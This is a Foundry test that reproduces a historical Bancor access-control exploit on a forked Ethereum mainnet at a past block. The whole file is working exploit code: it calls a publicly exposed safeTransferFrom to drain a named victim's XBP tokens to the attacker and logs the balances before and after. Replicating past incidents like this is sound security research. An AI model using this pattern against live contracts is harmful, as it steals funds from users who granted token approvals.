// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Bancor Protocol Access Control Exploit PoC

Some of the newly deployed Bancor contracts had the 'safeTransferFrom' function public.

As a result, if any user had granted approval to these contracts was vulnerable.

The attacker can check if an user had granted an allowance to Bancor Contracts to transfer the ERC20 token 

Example tx - https://etherscan.io/tx/0x4643b63dcbfc385b8ab8c86cbc46da18c2e43d277de3e5bc3b4516d3c0fdeb9f
*/

interface IBancor {
    function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
}

contract BancorExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
    address attacker = address(this);
    IERC20 XBPToken = IERC20(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40);

    IBancor bancorContract = IBancor(bancorAddress);

    function setUp() public {
        cheats.createSelectFork("mainnet", 10_307_563); // fork mainnet at 10307563
    }

    function testsafeTransfer() public {
        emit log_named_uint(
            "Victim XBPToken Allowance to Bancor Contract : ", (XBPToken.allowance(victim, bancorAddress) / 1 ether)
        );
        emit log_named_uint("[Before Attack]Victim XBPToken Balance : ", (XBPToken.balanceOf(victim)) / 1 ether);
        emit log_named_uint("[Before Attack]Attacker XBPToken Balance : ", (XBPToken.balanceOf(attacker)) / 1 ether);

        cheats.prank(address(this));
        bancorContract.safeTransferFrom(
            IERC20(address(XBPToken)),
            victim,
            attacker,
            XBPToken.balanceOf(victim) //905987977635678910008152
        );
        emit log_string("--------------------------------------------------------------");
        emit log_named_uint("[After Attack]Victim XBPToken Balance : ", (XBPToken.balanceOf(victim)) / 1 ether);
        emit log_named_uint("[After Attack]Attacker XBPToken Balance : ", (XBPToken.balanceOf(attacker)) / 1 ether);
    }
}
